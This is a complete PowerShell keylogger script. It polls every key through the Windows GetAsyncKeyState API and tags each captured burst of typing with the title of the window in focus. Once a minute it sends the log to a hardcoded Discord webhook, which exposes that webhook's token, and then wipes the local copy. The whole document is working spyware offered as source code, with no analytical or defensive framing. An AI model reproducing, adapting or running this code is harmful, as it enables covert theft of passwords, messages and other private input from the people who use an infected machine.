# Save this as keylogger_focus_v4.ps1
# Define the log file and Discord webhook URL
$logFile = "C:\key_log.txt"
$discordWebhookUrl = "https://discord.com/api/webhooks/1281143685895159809/FnbUZFSOnixzoac78xUQuXJ7qve5OoH1jZ8ejA7zDPUbqb1LX-7ltk0adeRzUYq0H0Un"
$keystrokeBuffer = ""
$currentFocusedApp = ""

# Ensure the log file exists or create it
if (-not (Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File -Force
}

# Load Windows API for capturing keystrokes and focused window
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;

    public class FocusHelper {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
    }
"@

# Function to get the currently focused process name or app
function Get-FocusedApp {
    $handle = [FocusHelper]::GetForegroundWindow()
    $windowTitle = New-Object System.Text.StringBuilder 256
    [void] [FocusHelper]::GetWindowText($handle, $windowTitle, $windowTitle.Capacity)

    # If the title is empty, try to get the process name
    if ($windowTitle.ToString() -eq "") {
        $focusedProcess = Get-Process | Where-Object { $_.MainWindowHandle -eq $handle }
        if ($focusedProcess) {
            return $focusedProcess.Name
        }
    }
    return $windowTitle.ToString()
}

# Function to write keystrokes to the log file with spaces between each character
function Log-Keystroke {
    param([string]$keyChar)
    # Add a space between each keystroke for readability
    $global:keystrokeBuffer += "$keyChar "
}

# Function to write activity (focused app or keystrokes) to the log file
function Log-Activity {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "$timestamp - $message"
    Add-Content -Path $logFile -Value $entry
}

# Function to send the log file to Discord
function Send-LogToDiscord {
    try {
        # Prepare the log content
        $logContent = Get-Content $logFile -Raw
        $payload = @{
            content = "`n``n" + $logContent
        }

        # Send the content to Discord
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json)
    } catch {
        Write-Host "Error sending log file to Discord: $_"
    }
}

# Function to delete the old log file after sending it
function Delete-LogFile {
    try {
        Remove-Item -Path $logFile
        # Recreate the log file after deletion
        New-Item -Path $logFile -ItemType File -Force
    } catch {
        Write-Host "Error deleting log file: $_"
    }
}

# Function to capture and log the currently focused window and associated keystrokes
function Log-FocusedApp {
    $focusedApp = Get-FocusedApp
    
    # Check if the focused window has changed
    if ($global:currentFocusedApp -ne $focusedApp) {
        # Log the previous app's keystrokes if any exist
        if ($keystrokeBuffer -ne "") {
            Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
            $global:keystrokeBuffer = ""
        }

        # Update the current focused app and log the new focused app
        $global:currentFocusedApp = $focusedApp
        Log-Activity "[FOCUSED APP]: $focusedApp"
    }
}

# Main loop to capture keystrokes and log them
$startTime = Get-Date

while ($true) {
    Log-FocusedApp

    # Capture key presses and filter out non-printable characters
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [FocusHelper]::GetAsyncKeyState($i)

        # Only capture keydown events (ignore key releases) and log printable characters
        if ($keyState -band 0x8000) {
            $keyChar = [char]$i

            # Only log visible ASCII characters (printable characters) between 32 (space) and 126
            if ($i -ge 32 -and $i -le 126) {
                Log-Keystroke $keyChar
            }
        }
    }

    # Delay to avoid rapid capturing of key presses
    Start-Sleep -Milliseconds 90  # Adjust the delay if needed to reduce duplicate characters

    # Send logs every minute
    $elapsedTime = (Get-Date) - $startTime
    if ($elapsedTime.TotalMinutes -ge 1) {
        if ($keystrokeBuffer -ne "") {
            Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
            $keystrokeBuffer = ""
        }

        Send-LogToDiscord
        Delete-LogFile
        $startTime = Get-Date
    }
}

